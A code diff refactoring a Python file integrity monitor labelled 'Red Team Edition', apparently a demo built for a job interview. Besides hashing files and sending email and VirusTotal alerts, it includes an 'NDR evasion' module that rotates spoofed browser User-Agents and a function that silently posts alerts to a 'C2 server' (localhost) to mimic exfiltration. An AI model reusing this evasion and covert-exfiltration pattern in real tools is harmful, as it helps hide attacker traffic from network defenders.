@@ -10,23 +10,22 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from datetime import datetime
 
-# --- CONFIGURATION ---
+# --- CONFIG ---
 BASELINES_DIR = "baselines"
 LOG_FILE = "security_events.log"
 
-# --- E-MAIL SETTINGS (FILL THESE) ---
-EMAIL_SENDER = "YOUR_EMAIL_HERE"         # Example: myemail@gmail.com
-EMAIL_PASSWORD = "YOUR_APP_PASSWORD_HERE" # Google App Password
-EMAIL_RECEIVER = "RECEIVER_EMAIL_HERE"   # Who will receive the alert?
+# Email Config (Leave placeholders if not testing email)
+EMAIL_SENDER = "YOUR_EMAIL_HERE"
+EMAIL_PASSWORD = "YOUR_APP_PASSWORD_HERE"
+EMAIL_RECEIVER = "RECEIVER_EMAIL_HERE"
 
-# --- VIRUSTOTAL SETTINGS (FILL THIS) ---
+# Threat Intel
 VIRUSTOTAL_API_KEY = "YOUR_VIRUSTOTAL_API_KEY_HERE"
 
-# --- NDR EVASION SETTINGS ---
-# Saldırganın C2 sunucusu (Demo amaçlı localhost)
+# C2 Server for Exfiltration (Demo: Localhost)
 C2_SERVER_URL = "http://127.0.0.1:8080/log_collector"
 
-# --- COLORS ---
+# CLI Colors
 class Colors:
     HEADER = '\033[95m'
     BLUE = '\033[94m'
@@ -42,111 +41,88 @@ def ensure_dirs():
 
 def log_event(message):
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    formatted_message = f"[{timestamp}] {message}"
     with open(LOG_FILE, "a") as f:
-        f.write(formatted_message + "\n")
+        f.write(f"[{timestamp}] {message}\n")
 
-# --- NDR EVASION MODULE (STEALTH HEADERS) ---
+# --- STEALTH MODULE (NDR EVASION) ---
 def get_stealth_headers():
-    """
-    NDR (Network Detection Response) ürünlerini atlatmak için
-    rastgele bir User-Agent seçer.
-    """
+    # Rotates User-Agents to mimic legitimate browser traffic
+    # Bypasses basic anomaly detection rules based on 'python-requests'
     user_agents = [
-        # Chrome - Windows
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        # Firefox - Windows
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
-        # Edge - Windows
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-        # Safari - macOS
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15"
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
     ]
     
     headers = {
         'User-Agent': random.choice(user_agents),
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.5',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
         'Connection': 'keep-alive'
     }
-   
+    
+    # Add VT Key only if it's set
     if "YOUR_" not in VIRUSTOTAL_API_KEY:
         headers["x-apikey"] = VIRUSTOTAL_API_KEY
         
     return headers
 
 def send_stealth_report_to_c2(message):
-    
+    # Mimics a browser posting data to a C2 server
     headers = get_stealth_headers()
-   
+    
+    # Don't leak the API key to C2
     if "x-apikey" in headers:
         del headers["x-apikey"]
 
     try:
+        # Short timeout to avoid hanging during demos
         requests.post(C2_SERVER_URL, json={"alert": message}, headers=headers, timeout=1)
-        # Başarılı olursa logla (Genelde sunucu olmadığı için buraya girmez)
-    except requests.exceptions.ConnectionError:
-        
-        pass 
-    except Exception:
+    except:
+        # Silent fail is intended for stealth tools
         pass
 
-# --- E-MAIL SENDER ---
+# --- ALERTS ---
 def send_email_alert(message):
-    if "YOUR_" in EMAIL_PASSWORD: 
-        # print(f"{Colors.YELLOW}[!] Email not sent. Please configure EMAIL_PASSWORD.{Colors.RESET}")
-        return 
+    if "YOUR_" in EMAIL_PASSWORD: return 
 
-    subject = "🚨 SECURITY ALERT: File Integrity Compromised!"
-    
     msg = MIMEMultipart()
     msg['From'] = EMAIL_SENDER
     msg['To'] = EMAIL_RECEIVER
-    msg['Subject'] = subject
+    msg['Subject'] = "🚨 SECURITY ALERT: Integrity Violation"
     
-    body = f"""
-    Suspicious activity detected on the system!
-    
-    DETAILS:
-    {message}
-    
-    Time: {datetime.now()}
-    This message was automatically sent by the Python File Integrity Monitor.
-    """
+    body = f"Suspicious activity detected!\n\nDETAILS:\n{message}\n\nTimestamp: {datetime.now()}"
     msg.attach(MIMEText(body, 'plain'))
     
     try:
         server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls()
         server.login(EMAIL_SENDER, EMAIL_PASSWORD)
-        text = msg.as_string()
-        server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, text)
+        server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
         server.quit()
-        print(f"{Colors.YELLOW}    [>] Email notification sent!{Colors.RESET}")
+        print(f"{Colors.YELLOW}    [>] Email alert sent.{Colors.RESET}")
     except Exception as e:
-        print(f"{Colors.RED}[!] Email sending error: {e}{Colors.RESET}")
+        print(f"{Colors.RED}[!] Email failed: {e}{Colors.RESET}")
 
-# --- VIRUSTOTAL CHECK ---
 def check_virustotal(file_hash):
     if "YOUR_" in VIRUSTOTAL_API_KEY: return None
 
     url = f"https://www.virustotal.com/api/v3/files/{file_hash}"
-   
-    headers = get_stealth_headers() 
+    # Use stealth headers to avoid being blocked by VT bot protection
+    headers = get_stealth_headers()
     
     try:
-        response = requests.get(url, headers=headers)
+        response = requests.get(url, headers=headers, timeout=5)
         if response.status_code == 200:
-            json_resp = response.json()
-            stats = json_resp['data']['attributes']['last_analysis_stats']
+            stats = response.json()['data']['attributes']['last_analysis_stats']
             return stats['malicious']
         elif response.status_code == 404:
-            return -1
-        else:
-            return None
-    except Exception:
+            return -1 # Unknown file
+    except:
         return None
+    return None
 
+# --- CORE FUNCTIONS ---
 def calculate_file_hash(filepath):
     sha256_hash = hashlib.sha256()
     try:
@@ -154,136 +130,130 @@ def calculate_file_hash(filepath):
             for byte_block in iter(lambda: f.read(4096), b""):
                 sha256_hash.update(byte_block)
         return sha256_hash.hexdigest()
-    except Exception:
+    except:
         return None
 
 def create_baseline():
     ensure_dirs()
-    target_folder = input(f"{Colors.BLUE}[?] Enter directory path to scan: {Colors.RESET}")
+    target_folder = input(f"{Colors.BLUE}[?] Target Directory: {Colors.RESET}")
     if not os.path.isdir(target_folder):
-        print(f"{Colors.RED}[!] Error: Directory not found.{Colors.RESET}")
+        print(f"{Colors.RED}[!] Invalid directory.{Colors.RESET}")
         return
 
-    session_name = input(f"{Colors.BLUE}[?] Give this session a name: {Colors.RESET}") or "default"
+    session_name = input(f"{Colors.BLUE}[?] Session Name (default: baseline): {Colors.RESET}") or "baseline"
+    print(f"\n{Colors.YELLOW}[*] Hashing files...{Colors.RESET}")
     
-    print(f"\n{Colors.YELLOW}[*] Scanning files...{Colors.RESET}")
     files_data = {}
-    
-    for root, dirs, files in os.walk(target_folder):
+    for root, _, files in os.walk(target_folder):
         for file in files:
             filepath = os.path.join(root, file)
-            file_hash = calculate_file_hash(filepath)
-            if file_hash:
-                files_data[filepath] = file_hash
+            f_hash = calculate_file_hash(filepath)
+            if f_hash:
+                files_data[filepath] = f_hash
 
     baseline_data = {
-        "metadata": {"target_directory": target_folder, "timestamp": time.ctime()},
+        "metadata": {"target": target_folder, "time": str(datetime.now())},
         "files": files_data
     }
 
-    output_filename = os.path.join(BASELINES_DIR, f"{session_name}.json")
-    with open(output_filename, "w") as f:
+    out_file = os.path.join(BASELINES_DIR, f"{session_name}.json")
+    with open(out_file, "w") as f:
         json.dump(baseline_data, f, indent=4)
 
-    print(f"\n{Colors.GREEN}[SUCCESS] Baseline saved!{Colors.RESET}")
-    log_event(f"Baseline created for {target_folder}")
+    print(f"{Colors.GREEN}[+] Baseline '{session_name}' saved.{Colors.RESET}")
+    log_event(f"New baseline created for {target_folder}")
 
 def monitor_integrity():
     ensure_dirs()
-    baseline_files = glob.glob(os.path.join(BASELINES_DIR, "*.json"))
+    baselines = glob.glob(os.path.join(BASELINES_DIR, "*.json"))
     
-    if not baseline_files:
-        print(f"{Colors.RED}[!] No baselines found.{Colors.RESET}")
+    if not baselines:
+        print(f"{Colors.RED}[!] No baselines found. Create one first.{Colors.RESET}")
         return
 
-    print(f"\n{Colors.HEADER}--- AVAILABLE SESSIONS ---{Colors.RESET}")
-    for index, file in enumerate(baseline_files):
-        print(f"{index + 1}) {os.path.basename(file)}")
+    print(f"\n{Colors.HEADER}--- LOAD SESSION ---{Colors.RESET}")
+    for i, f in enumerate(baselines):
+        print(f"{i + 1}) {os.path.basename(f)}")
     
     try:
-        selection = int(input(f"\n{Colors.BLUE}[?] Select session: {Colors.RESET}")) - 1
-        if selection < 0 or selection >= len(baseline_files): return
-    except ValueError: return
+        sel = int(input(f"\n{Colors.BLUE}[?] Select ID: {Colors.RESET}")) - 1
+        if sel < 0 or sel >= len(baselines): return
+    except: return
 
-    selected_file = baseline_files[selection]
-    with open(selected_file, "r") as f:
+    with open(baselines[sel], "r") as f:
         data = json.load(f)
 
-    target_folder = data['metadata']['target_directory']
+    target_folder = data['metadata']['target']
     saved_hashes = data['files']
     
-    print(f"\n{Colors.BLUE}[*] Monitoring started (Stealth Reporting Active)...{Colors.RESET}")
+    print(f"\n{Colors.BLUE}[*] Monitoring started... (Stealth Mode: ON){Colors.RESET}")
 
-    issues_found = False
-    current_files_on_disk = []
-    for root, dirs, files in os.walk(target_folder):
-        for file in files:
-            current_files_on_disk.append(os.path.join(root, file))
-
-    def trigger_alert(filepath, alert_type, file_hash=None):
-        vt_result = ""
+    current_files = []
+    issues = False
+    
+    # Helper to handle alerts
+    def trigger(path, alert_type, f_hash=None):
+        vt_info = ""
         vt_score = 0
         
-        # VirusTotal Check
-        if file_hash and "YOUR_" not in VIRUSTOTAL_API_KEY:
-            print(f"{Colors.YELLOW}    [>] Checking VirusTotal...{Colors.RESET}", end="\r")
-            vt_score = check_virustotal(file_hash)
+        # VirusTotal Lookup
+        if f_hash and "YOUR_" not in VIRUSTOTAL_API_KEY:
+            print(f"{Colors.YELLOW}    [>] Querying VirusTotal...{Colors.RESET}", end="\r")
+            vt_score = check_virustotal(f_hash)
             
-            if vt_score is None: vt_result = " (VT: Error)"
-            elif vt_score == -1: vt_result = " (VT: Unknown File)"
-            elif vt_score > 0: vt_result = f" (VT: ☣️ MALICIOUS: {vt_score}/70)"
-            else: vt_result = " (VT: Clean)"
+            if vt_score is None: vt_info = " (VT: Error)"
+            elif vt_score == -1: vt_info = " (VT: Unknown)"
+            elif vt_score > 0: vt_info = f" (VT: ☣️ MALICIOUS: {vt_score}/70)"
+            else: vt_info = " (VT: Clean)"
         
-        msg = f"{alert_type}: {filepath}{vt_result}"
+        msg = f"{alert_type}: {path}{vt_info}"
         
-        color = Colors.RED
-        if vt_score and vt_score > 0:
-            msg = f"☣️ VIRUS DETECTED! {msg}"
-            color = Colors.RED + Colors.BOLD
-
+        # Determine Color
+        color = Colors.RED + Colors.BOLD if (vt_score and vt_score > 0) else Colors.RED
         print(f"{color}[!!!] {msg}{Colors.RESET}")
         
-        # --- SHOWCASE: PRINT SPOOFED HEADER ---
-        spoofed_ua = get_stealth_headers()['User-Agent']
-        print(f"{Colors.YELLOW}    [Stealth] Report sent with User-Agent: {spoofed_ua[:40]}...{Colors.RESET}")
+        # SHOWCASE: Print the Spoofed Header for the Interview
+        ua = get_stealth_headers()['User-Agent']
+        print(f"{Colors.YELLOW}    [Stealth] Log exfiltrated using UA: {ua[:30]}...{Colors.RESET}")
 
         log_event(msg)
-        
-        # --- SEND EMAIL & C2 REPORT ---
         send_email_alert(msg)
-        send_stealth_report_to_c2(msg) 
-        
+        send_stealth_report_to_c2(msg)
         return True
 
-    for filepath, original_hash in saved_hashes.items():
-        if not os.path.exists(filepath):
-            issues_found = trigger_alert(filepath, "FILE DELETED")
-        else:
-            current_hash = calculate_file_hash(filepath)
-            if current_hash != original_hash:
-                issues_found = trigger_alert(filepath, "FILE MODIFIED", current_hash)
+    # Check Existing & Modified
+    for root, _, files in os.walk(target_folder):
+        for file in files:
+            path = os.path.join(root, file)
+            current_files.append(path)
+            
+            if path not in saved_hashes:
+                # NEW FILE
+                f_hash = calculate_file_hash(path)
+                issues = trigger(path, "NEW FILE", f_hash)
+            else:
+                # CHECK MODIFICATION
+                f_hash = calculate_file_hash(path)
+                if f_hash != saved_hashes[path]:
+                    issues = trigger(path, "MODIFIED", f_hash)
 
-    for filepath in current_files_on_disk:
-        if filepath not in saved_hashes:
-            current_hash = calculate_file_hash(filepath)
-            issues_found = trigger_alert(filepath, "NEW FILE DETECTED", current_hash)
+    # Check Deleted
+    for path in saved_hashes:
+        if path not in current_files:
+            issues = trigger(path, "DELETED")
 
-    if not issues_found:
-        print(f"\n{Colors.GREEN}[SAFE] System is clean.{Colors.RESET}")
-
-def show_banner():
-    print(f"\n{Colors.HEADER}==================================================")
-    print("   FIM ULTIMATE - RED TEAM EDITION    ")
-    print(f"=================================================={Colors.RESET}")
+    if not issues:
+        print(f"\n{Colors.GREEN}[SAFE] System integrity verified.{Colors.RESET}")
 
 if __name__ == "__main__":
     while True:
-        show_banner()
-        print("A) Create Baseline")
-        print("B) Monitor Integrity")
-        print("Q) Quit")
-        choice = input(f"\n{Colors.BOLD}Selection: {Colors.RESET}").upper()
+        print(f"\n{Colors.HEADER}=== FIM ULTIMATE (Red Team Edition) ==={Colors.RESET}")
+        print("1) New Baseline")
+        print("2) Start Monitor")
+        print("3) Exit")
         
-        if choice == "A": create_baseline()
-        elif choice == "B": monitor_integrity()
-        elif choice == "Q": break
+        choice = input(f"\n{Colors.BOLD}> {Colors.RESET}")
+        
+        if choice == "1": create_baseline()
+        elif choice == "2": monitor_integrity()
+        elif choice == "3": break
